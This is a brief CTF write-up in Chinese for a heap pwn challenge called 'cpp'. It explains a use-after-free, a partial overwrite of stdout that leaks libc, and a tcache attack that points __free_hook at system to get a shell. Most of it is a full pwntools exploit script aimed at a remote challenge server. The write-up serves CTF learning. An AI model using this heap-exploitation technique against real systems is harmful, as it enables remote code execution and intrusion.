# cpp

**Second Blood**

比较明显的UAF漏洞，控制好堆布局，利用修改unsorted chunk的fd低地址指向_IO_write_ptr，修改其末位为"\xF0"即可，或者修改stdout的flags位和_IO_write_base，前者只需要用0x20的chunk即可设置，布局比较简单

leak后再次tcache attck修改&\_\_free\_hook-8位置为"/bin/sh\x00"+system_addr即可在edit触发free时getshell

### EXP:
```
from pwn import *
context.log_level="debug"

def add():
    p.sendafter("ye\n","C")

def edit(note):
    p.sendafter("ye\n","W")
    p.sendline(note)

def delete():
    p.sendafter("ye\n","D")

for i in range(100):
  try:  
    p=remote("123.57.4.93",12001)
    #p=process("./cpp")
    add()
    add()
    add()
    edit("a"*0x80)
    for i in range(8):
        delete()
    edit("\x00"*0x18)
    edit("\x00"*0x18)
    edit("\x88\xf7")
    edit("\x88\xf7")
    edit("\x88\xf7")
    delete()
    delete()
    delete()
    delete()
    delete()

    edit("\x00")
    add()
    edit("\xf0")
    edit("\xf0")
    p.recv(5)
    libc=u64(p.recv(6)+"\x00\x00")+ 0x7ffff7443000-0x7ffff78308c0
    print hex(libc)

    add()
    edit(p64(libc+0x03ed8e8-0x8))
    edit(p64(libc+0x03ed8e8-0x8))
    edit("/bin/sh\x00"+p64(libc+0x4f4e0))
    #edit("\x00")
    #gdb.attach(p)
    p.interactive()
  except:
    print "fail"
```